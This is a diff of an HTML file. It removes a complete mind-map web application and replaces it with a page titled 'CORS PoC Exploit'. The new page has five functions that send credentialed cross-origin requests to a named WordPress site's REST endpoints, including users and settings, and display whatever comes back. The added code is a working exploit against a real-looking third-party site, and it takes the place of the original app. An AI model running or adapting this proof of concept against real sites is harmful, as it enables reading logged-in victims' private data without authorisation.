@@ -1,732 +1,82 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <title>MindMap — Final</title>
-    <style>
-      :root {
-        --bg: #0f1724;
-        --panel: #0b1220;
-        --muted: #9aa6bf;
-        --accent: #7c5cff;
-        --card: #0c1626;
-      }
-
-      * {
-        box-sizing: border-box;
-        font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial;
-        color: #e6eef8;
-      }
-
-      html,
-      body {
-        height: 100%;
-        margin: 0;
-        background: linear-gradient(180deg, var(--bg), #071021);
-      }
-
-      .topbar {
-        position: fixed;
-        top: 10px;
-        left: 12px;
-        right: 12px;
-        height: 56px;
-        display: flex;
-        align-items: center;
-        gap: 8px;
-        padding: 6px 10px;
-        border-radius: 10px;
-        background: rgba(255, 255, 255, 0.02);
-        backdrop-filter: blur(6px);
-        z-index: 60;
-      }
-
-      .brand {
-        display: flex;
-        gap: 10px;
-        align-items: center;
-      }
-
-      .logo {
-        width: 40px;
-        height: 40px;
-        border-radius: 8px;
-        background: linear-gradient(135deg, var(--accent), #33c2ff);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        color: #041025;
-        font-weight: 700;
-      }
-
-      .title {
-        font-weight: 700;
-      }
-
-      .toolbar {
-        margin-left: auto;
-        display: flex;
-        gap: 8px;
-        align-items: center;
-      }
-
-      .btn {
-        background: transparent;
-        border: 1px solid rgba(255, 255, 255, 0.06);
-        color: var(--muted);
-        padding: 8px 12px;
-        border-radius: 10px;
-        cursor: pointer;
-      }
-
-      .btn.primary {
-        background: linear-gradient(90deg, var(--accent), #33c2ff);
-        color: #021026;
-        border: 0;
-      }
-
-      .workspace {
-        position: absolute;
-        inset: 72px 12px 12px 12px;
-        border-radius: 12px;
-        overflow: hidden;
-      }
-
-      #stage {
-        position: relative;
-        width: 100%;
-        height: 100%;
-        touch-action: none;
-        outline: none;
-      }
-
-      .grid {
-        position: absolute;
-        inset: 0;
-        background-image: linear-gradient(
-            to right,
-            rgba(255, 255, 255, 0.02) 1px,
-            transparent 1px
-          ),
-          linear-gradient(to bottom, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
-        background-size: 40px 40px;
-        opacity: 0.08;
-        pointer-events: none;
-      }
-
-      svg.connectors {
-        position: absolute;
-        inset: 0;
-        width: 100%;
-        height: 100%;
-        pointer-events: none;
-        overflow: visible;
-        z-index: 1;
-      }
-
-      .node {
-        position: absolute;
-        min-width: 140px;
-        max-width: 360px;
-        padding: 10px 14px;
-        border-radius: 12px;
-        background: linear-gradient(
-          180deg,
-          rgba(255, 255, 255, 0.02),
-          rgba(255, 255, 255, 0.01)
-        );
-        border: 1px solid rgba(255, 255, 255, 0.06);
-        box-shadow: 0 12px 30px rgba(2, 6, 23, 0.6);
-        z-index: 5;
-        cursor: grab;
-        user-select: none;
-      }
-
-      .node:active {
-        cursor: grabbing;
-      }
-
-      .node .title {
-        font-weight: 700;
-        font-size: 15px;
-        outline: none;
-      }
-
-      .node .title[contenteditable="true"]:focus {
-        outline: 2px solid rgba(124, 92, 255, 0.14);
-        border-radius: 6px;
-        padding: 2px;
-      }
-
-      .node .meta {
-        margin-top: 6px;
-        font-size: 13px;
-        color: var(--muted);
-      }
-
-      .info-btn {
-        position: absolute;
-        left: -26px;
-        top: 10px;
-        width: 24px;
-        height: 24px;
-        border-radius: 6px;
-        background: linear-gradient(135deg, var(--accent), #33c2ff);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 12px;
-        color: #021026;
-        cursor: pointer;
-        z-index: 6;
-      }
-
-      .info-panel {
-        display: none;
-        position: absolute;
-        left: 0;
-        top: 100%;
-        margin-top: 8px;
-        width: 260px;
-        background: #041225;
-        border-radius: 10px;
-        padding: 8px;
-        border: 1px solid rgba(255, 255, 255, 0.04);
-        z-index: 8;
-      }
-
-      .info-panel textarea {
-        width: 100%;
-        height: 96px;
-        background: transparent;
-        border: 1px solid rgba(255, 255, 255, 0.03);
-        color: #dce9ff;
-        padding: 8px;
-        border-radius: 8px;
-        font-size: 13px;
-      }
-
-      .node.focused {
-        box-shadow: 0 20px 48px rgba(124, 92, 255, 0.18);
-        transform: translateZ(0);
-      }
-
-      .floating-menu {
-        position: fixed;
-        display: none;
-        z-index: 80;
-        background: #07152a;
-        border: 1px solid rgba(255, 255, 255, 0.04);
-        padding: 6px;
-        border-radius: 8px;
-      }
-
-      .floating-menu button {
-        display: block;
-        background: transparent;
-        border: 0;
-        color: var(--muted);
-        padding: 6px 8px;
-        text-align: left;
-        width: 160px;
-      }
-
-      .footer {
-        position: fixed;
-        left: 12px;
-        bottom: 12px;
-        background: rgba(255, 255, 255, 0.02);
-        padding: 8px 12px;
-        border-radius: 12px;
-        color: var(--muted);
-        border: 1px solid rgba(255, 255, 255, 0.03);
-        z-index: 60;
-      }
-
-      @media (max-width: 900px) {
-        .topbar {
-          height: 64px;
-        }
-
-        .info-panel {
-          width: 220px;
-        }
-      }
-    </style>
-  </head>
-
-  <body>
-    <div class="topbar" role="toolbar" aria-label="top toolbar">
-      <div class="brand">
-        <div class="logo">MM</div>
-        <div>
-          <div class="title">MindMap Final</div>
-          <div style="font-size:12px;color:var(--muted)">
-            mobile + desktop
-          </div>
-        </div>
-      </div>
-
-      <div class="toolbar">
-        <button id="btnAdd" class="btn primary">+ Add Box</button>
-        <button id="btnConnect" class="btn">Connect Mode</button>
-        <button id="btnChild" class="btn">Add Child</button>
-        <button id="btnExport" class="btn">Export HTML</button>
-        <button id="btnFit" class="btn">Fit</button>
-      </div>
-    </div>
-
-    <div class="workspace">
-      <div id="stage" tabindex="0">
-        <div class="grid"></div>
-        <svg id="svg" class="connectors" xmlns="http://www.w3.org/2000/svg"></svg>
-      </div>
-    </div>
-
-    <div id="menu" class="floating-menu" aria-hidden="true">
-      <button data-action="add-child">Add Child</button>
-      <button data-action="change-color">Change Color</button>
-      <button data-action="delete">Delete</button>
-    </div>
-
-    <div class="footer">
-      Shortcuts: Shift+Click to connect • Double-tap/Double-click empty to add •
-      Hold node for menu
-    </div>
-
-    <script>
-      /* --------------- MAIN LOGIC --------------- */
-      (() => {
-        // --- state ---
-        const state = {
-          nodes: {},
-          rootId: null,
-          selected: null,
-          connectMode: false,
-          zoom: 1,
-          panX: 0,
-          panY: 0,
-          menuTarget: null
-        };
-
-        // --- DOM refs ---
-        const stage = document.getElementById("stage");
-        const svg = document.getElementById("svg");
-        const btnAdd = document.getElementById("btnAdd");
-        const btnConnect = document.getElementById("btnConnect");
-        const btnChild = document.getElementById("btnChild");
-        const btnExport = document.getElementById("btnExport");
-        const btnFit = document.getElementById("btnFit");
-        const menu = document.getElementById("menu");
-
-        const uid = (n = 8) => Math.random().toString(36).slice(2, 2 + n);
-        const now = () => Date.now();
-
-        /* ---------- Node Creation ---------- */
-        function createNodeModel({
-          text = "New Box",
-          x = 100,
-          y = 100,
-          color = "#7c5cff",
-          note = ""
-        } = {}) {
-          const id = uid();
-          state.nodes[id] = {
-            id,
-            text,
-            x,
-            y,
-            color,
-            note,
-            children: [],
-            parents: [],
-            created: now()
-          };
-          return state.nodes[id];
-        }
-
-        /* ---------- Create Node Element ---------- */
-        function createNodeEl(node) {
-          const el = document.createElement("div");
-          el.className = "node";
-          el.dataset.id = node.id;
-          el.style.left = node.x + "px";
-          el.style.top = node.y + "px";
-          el.style.borderLeft = `6px solid ${node.color}`;
-
-          // info button
-          const infoBtn = document.createElement("div");
-          infoBtn.className = "info-btn";
-          infoBtn.innerHTML = "i";
-          el.appendChild(infoBtn);
-
-          // title
-          const title = document.createElement("div");
-          title.className = "title";
-          title.contentEditable = true;
-          title.spellcheck = false;
-          title.innerText = node.text;
-          el.appendChild(title);
-
-          // meta
-          const meta = document.createElement("div");
-          meta.className = "meta";
-          meta.innerHTML = `<small style="color:var(--muted)">id:${node.id}</small>`;
-          el.appendChild(meta);
-
-          // info panel
-          const infoPanel = document.createElement("div");
-          infoPanel.className = "info-panel";
-          infoPanel.innerHTML = `<textarea placeholder="Additional info">${node.note ||
-            ""}</textarea>`;
-          el.appendChild(infoPanel);
-
-          // title focus
-          title.addEventListener("focus", () => {
-            hideAllInfoPanels();
-            infoPanel.style.display = "block";
-            el.classList.add("focused");
-            selectNode(node.id);
-          });
-
-          title.addEventListener("blur", () => {
-            node.text = title.innerText;
-            setTimeout(() => {
-              if (
-                document.activeElement !== infoPanel.querySelector("textarea")
-              ) {
-                infoPanel.style.display = "none";
-                el.classList.remove("focused");
-              }
-            }, 120);
-          });
-
-          title.addEventListener("input", () => (node.text = title.innerText));
-
-          // info button click
-          infoBtn.addEventListener("click", e => {
-            e.stopPropagation();
-            const open = infoPanel.style.display === "block";
-            hideAllInfoPanels();
-            infoPanel.style.display = open ? "none" : "block";
-            if (!open) infoPanel.querySelector("textarea").focus();
-            selectNode(node.id);
-          });
-
-          // textarea update
-          const ta = infoPanel.querySelector("textarea");
-          ta.addEventListener("input", () => (node.note = ta.value));
-          ta.addEventListener("blur", () => {
-            setTimeout(() => {
-              if (document.activeElement !== title) {
-                infoPanel.style.display = "none";
-                el.classList.remove("focused");
-              }
-            }, 120);
-          });
-
-          // dragging
-          el.addEventListener("pointerdown", ev => {
-            ev.stopPropagation();
-            if (ev.button === 2) return;
-            startDrag(ev, el, node);
-          });
-
-          el.addEventListener("dblclick", ev => {
-            ev.stopPropagation();
-            title.focus();
-          });
-
-          el.addEventListener("contextmenu", ev => {
-            ev.preventDefault();
-            showNodeMenu(el, ev.clientX, ev.clientY);
-          });
-
-          let longpress = null;
-          el.addEventListener("pointerdown", ev => {
-            longpress = setTimeout(
-              () => showNodeMenu(el, ev.clientX, ev.clientY),
-              600
-            );
-          });
-          el.addEventListener("pointerup", () => clearTimeout(longpress));
-
-          // shift+click connect
-          el.addEventListener("click", ev => {
-            ev.stopPropagation();
-            if (ev.shiftKey || state.connectMode) {
-              if (!state._connectFrom) {
-                state._connectFrom = node.id;
-                el.classList.add("focused");
-              } else {
-                if (state._connectFrom !== node.id)
-                  connectNodes(state._connectFrom, node.id);
-                const prev = document.querySelector(
-                  `.node[data-id="${state._connectFrom}"]`
-                );
-                if (prev) prev.classList.remove("focused");
-                state._connectFrom = null;
-              }
-            } else {
-              selectNode(node.id);
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<html>
+    <head>
+        <script>
+            function cors1() {
+                var xhttp=new XMLHttpRequest();
+                xhttp.onreadystatechange= function() {
+                    if (this.readyState == 4){
+                        document.getElementById("emo").innerHTML=alert(this.responseText);
+                    }
+                };
+                xhttp.open('GET',"https://www.accbusiness.com/wp-json",true);
+                xhttp.withCredentials=true;
+                xhttp.send();
             }
-          });
-
-          return el;
-        }
-
-        /* ---------- Helper UI ---------- */
-        function hideAllInfoPanels() {
-          document
-            .querySelectorAll(".info-panel")
-            .forEach(p => (p.style.display = "none"));
-          document
-            .querySelectorAll(".node.focused")
-            .forEach(n => n.classList.remove("focused"));
-        }
-
-        function selectNode(id) {
-          state.selected = id;
-          document.querySelectorAll(".node").forEach(el =>
-            el.classList.toggle("selected", el.dataset.id === id)
-          );
-        }
-
-        /* ---------- Add node ---------- */
-        function addNode(node) {
-          const el = createNodeEl(node);
-          stage.appendChild(el);
-          setTimeout(drawConnectors, 0);
-        }
-
-        /* ---------- Connection Drawing ---------- */
-        function connectNodes(fromId, toId) {
-          const from = state.nodes[fromId],
-            to = state.nodes[toId];
-          if (!from || !to) return;
-          if (!from.children.includes(toId)) from.children.push(toId);
-          if (!to.parents.includes(fromId)) to.parents.push(fromId);
-          drawConnectors();
-        }
-
-        function drawConnectors() {
-          while (svg.firstChild) svg.removeChild(svg.firstChild);
-          Object.values(state.nodes).forEach(n => {
-            (n.children || []).forEach(cid => {
-              const c = state.nodes[cid];
-              if (!c) return;
-              const a = centerOf(n.id),
-                b = centerOf(c.id);
-              const p = document.createElementNS(
-                "http://www.w3.org/2000/svg",
-                "path"
-              );
-              p.setAttribute("d", bezierPath(a, b));
-              p.setAttribute("stroke", n.color || "#7c5cff");
-              p.setAttribute("stroke-width", "3");
-              p.setAttribute("fill", "none");
-              p.setAttribute("stroke-linecap", "round");
-              svg.appendChild(p);
-            });
-          });
-        }
-
-        function centerOf(id) {
-          const el = document.querySelector(`.node[data-id="${id}"]`);
-          if (!el) return { x: 0, y: 0 };
-          return {
-            x: parseFloat(el.style.left) + el.offsetWidth / 2,
-            y: parseFloat(el.style.top) + el.offsetHeight / 2
-          };
-        }
-
-        function bezierPath(a, b) {
-          const dx = Math.abs(b.x - a.x);
-          const cx1 = a.x + Math.sign(b.x - a.x) * Math.max(40, dx * 0.25);
-          const cx2 = b.x - Math.sign(b.x - a.x) * Math.max(40, dx * 0.25);
-          return `M ${a.x} ${a.y} C ${cx1} ${a.y} ${cx2} ${b.y} ${b.x} ${b.y}`;
-        }
-
-        /* ---------- Pan & Zoom ---------- */
-        let dragging = null;
-        function startDrag(ev, el, model) {
-          ev.preventDefault();
-          dragging = {
-            el,
-            model,
-            sx: ev.clientX,
-            sy: ev.clientY,
-            ox: parseFloat(el.style.left),
-            oy: parseFloat(el.style.top)
-          };
-          document.addEventListener("pointermove", onMove);
-          document.addEventListener("pointerup", onUp);
-        }
-
-        function onMove(e) {
-          if (!dragging) return;
-          const dx = (e.clientX - dragging.sx) / state.zoom;
-          const dy = (e.clientY - dragging.sy) / state.zoom;
-          const nx = dragging.ox + dx;
-          const ny = dragging.oy + dy;
-          dragging.el.style.left = nx + "px";
-          dragging.el.style.top = ny + "px";
-          dragging.model.x = nx;
-          dragging.model.y = ny;
-          drawConnectors();
-        }
-
-        function onUp() {
-          dragging = null;
-          document.removeEventListener("pointermove", onMove);
-          document.removeEventListener("pointerup", onUp);
-        }
-
-        /* ---------- Context Menu ---------- */
-        function showNodeMenu(el, x, y) {
-          menu.style.display = "block";
-          menu.style.left = x + "px";
-          menu.style.top = y + "px";
-          menu.dataset.id = el.dataset.id;
-          state.menuTarget = el;
-        }
-
-        function hideMenu() {
-          menu.style.display = "none";
-          menu.dataset.id = "";
-          state.menuTarget = null;
-        }
-
-        menu.addEventListener("click", ev => {
-          const id = menu.dataset.id;
-          const action = ev.target.dataset.action;
-          if (!id || !action) return;
-          hideMenu();
-
-          if (action === "add-child") {
-            const parent = state.nodes[id];
-            const child = createNodeModel({
-              x: parent.x + 200,
-              y: parent.y + 80,
-              color: parent.color
-            });
-            parent.children.push(child.id);
-            child.parents.push(parent.id);
-            addNode(child);
-            drawConnectors();
-          } else if (action === "change-color") {
-            const newColor =
-              "#" +
-              Math.floor(Math.random() * 0xffffff)
-                .toString(16)
-                .padStart(6, "0");
-            const node = state.nodes[id];
-            node.color = newColor;
-            const el = document.querySelector(`.node[data-id="${id}"]`);
-            if (el) el.style.borderLeft = `6px solid ${newColor}`;
-            drawConnectors();
-          } else if (action === "delete") {
-            deleteNode(id);
-          }
-        });
-
-        stage.addEventListener("click", hideMenu);
-        document.addEventListener("scroll", hideMenu);
-
-        /* ---------- Delete Node ---------- */
-        function deleteNode(id) {
-          const node = state.nodes[id];
-          if (!node) return;
-          node.parents.forEach(pid => {
-            const p = state.nodes[pid];
-            if (p)
-              p.children = p.children.filter(cid => cid !== id);
-          });
-          node.children.forEach(cid => {
-            const c = state.nodes[cid];
-            if (c)
-              c.parents = c.parents.filter(pid => pid !== id);
-          });
-          const el = document.querySelector(`.node[data-id="${id}"]`);
-          if (el) el.remove();
-          delete state.nodes[id];
-          drawConnectors();
-        }
-
-        /* ---------- Export ---------- */
-        btnExport.addEventListener("click", () => {
-          const html = document.documentElement.outerHTML;
-          const blob = new Blob([html], { type: "text/html" });
-          const a = document.createElement("a");
-          a.href = URL.createObjectURL(blob);
-          a.download = "mindmap.html";
-          a.click();
-        });
-
-        /* ---------- Add / Connect / Fit ---------- */
-        btnAdd.addEventListener("click", () => {
-          const node = createNodeModel({
-            x: 200 + Math.random() * 200,
-            y: 200 + Math.random() * 200
-          });
-          addNode(node);
-        });
-
-        btnConnect.addEventListener("click", () => {
-          state.connectMode = !state.connectMode;
-          btnConnect.classList.toggle("primary", state.connectMode);
-          btnConnect.textContent = state.connectMode
-            ? "Connecting..."
-            : "Connect Mode";
-          state._connectFrom = null;
-        });
-
-        btnChild.addEventListener("click", () => {
-          if (!state.selected) return;
-          const parent = state.nodes[state.selected];
-          const child = createNodeModel({
-            x: parent.x + 200,
-            y: parent.y + 80,
-            color: parent.color
-          });
-          parent.children.push(child.id);
-          child.parents.push(parent.id);
-          addNode(child);
-          drawConnectors();
-        });
-
-        btnFit.addEventListener("click", () => {
-          const all = document.querySelectorAll(".node");
-          if (!all.length) return;
-          let minX = Infinity,
-            minY = Infinity,
-            maxX = -Infinity,
-            maxY = -Infinity;
-          all.forEach(el => {
-            const x = parseFloat(el.style.left),
-              y = parseFloat(el.style.top),
-              w = el.offsetWidth,
-              h = el.offsetHeight;
-            minX = Math.min(minX, x);
-            minY = Math.min(minY, y);
-            maxX = Math.max(maxX, x + w);
-            maxY = Math.max(maxY, y + h);
-          });
-          const cx = (minX + maxX) / 2;
-          const cy = (minY + maxY) / 2;
-          stage.scrollTo(cx - stage.clientWidth / 2, cy - stage.clientHeight / 2);
-        });
-
-        /* ---------- Init ---------- */
-        function init() {
-          const root = createNodeModel({ text: "Root", x: 400, y: 300 });
-          state.rootId = root.id;
-          addNode(root);
-        }
-
-        init();
-      })();
-    </script>
-  </body>
+            function cors2() {
+                var xhttp=new XMLHttpRequest();
+                xhttp.onreadystatechange= function() {
+                    if (this.readyState == 4){
+                        document.getElementById("emo").innerHTML=alert(this.responseText);
+                    }
+                };
+                xhttp.open('GET',"https://www.accbusiness.com/wp-json/wp/v2/posts",true);
+                xhttp.withCredentials=true;
+                xhttp.send();
+            }
+            function cors3() {
+                var xhttp=new XMLHttpRequest();
+                xhttp.onreadystatechange= function() {
+                    if (this.readyState == 4){
+                        document.getElementById("emo").innerHTML=alert(this.responseText);
+                    }
+                };
+                xhttp.open('GET',"https://www.accbusiness.com/wp-json/wp/v2/comments",true);
+                xhttp.withCredentials=true;
+                xhttp.send();
+            }
+            function cors4() {
+                var xhttp=new XMLHttpRequest();
+                xhttp.onreadystatechange= function() {
+                    if (this.readyState == 4){
+                        document.getElementById("emo").innerHTML=alert(this.responseText);
+                    }
+                };
+                xhttp.open('GET',"https://www.accbusiness.com/wp-json/wp/v2/settings",true);
+                xhttp.withCredentials=true;
+                xhttp.send();
+            }
+            function cors5() {
+                var xhttp=new XMLHttpRequest();
+                xhttp.onreadystatechange= function() {
+                    if (this.readyState == 4){
+                        document.getElementById("emo").innerHTML=alert(this.responseText);
+                    }
+                };
+                xhttp.open('GET',"https://www.accbusiness.com/wp-json/wp/v2/users",true);
+                xhttp.withCredentials=true;
+                xhttp.send();
+            }
+        </script>
+    </head>
+    <body>
+        <center>
+        <h2>[!]CORS PoC Exploit!!!</h2>
+        <div id="demo">
+            <button type="button" onclick="cors1()">/wp-json</button>
+            <button type="button" onclick="cors2()">/wp/v2/posts</button>
+            <button type="button" onclick="cors3()">/wp/v2/comments</button>
+            <button type="button" onclick="cors4()">/wp/v2/settings</button>
+            <button type="button" onclick="cors5()">/wp/v2/users</button>
+        </div>
+        <div id="emo"></div>
+        </center>
+    </body>
+</html>
+</body>
 </html>
